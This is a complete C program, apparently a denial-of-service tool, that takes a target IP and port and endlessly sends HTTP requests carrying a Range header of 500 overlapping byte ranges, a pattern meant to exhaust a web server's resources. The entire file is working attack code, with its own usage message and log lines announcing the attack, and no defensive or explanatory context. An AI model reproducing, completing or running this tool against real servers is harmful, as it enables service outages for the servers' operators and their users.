#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target-ip> <target-port>\n", argv[0]);
        return 1;
    }

    char *host = argv[1];
    int port = atoi(argv[2]);

    printf("[+] Launching DoS attack against %s:%d\n", host, port);

    int sock;
    struct sockaddr_in serv_addr;

    // Build malicious range header
    char malicious_ranges[5000];
    strcpy(malicious_ranges, "Range: bytes=");
    for (int i = 0; i < 500; i++) {
        char range[50];
        sprintf(range, "5-%d,", i*10);
        strcat(malicious_ranges, range);
    }
    malicious_ranges[strlen(malicious_ranges)-1] = '\0';
    strcat(malicious_ranges, "\r\n");

    // Build final request
    char final_request[7000];
    sprintf(final_request, "GET / HTTP/1.1\r\nHost: %s\r\n%sConnection: close\r\n\r\n", host, malicious_ranges);

    while(1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket error");
            continue;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);
        inet_pton(AF_INET, host, &serv_addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("Connect failed");
            close(sock);
            continue;
        }

        if (send(sock, final_request, strlen(final_request), 0) < 0) {
            perror("Send failed");
        } else {
            printf("[+] Malicious request sent.\n");
        }

        close(sock);
    }
    return 0;
}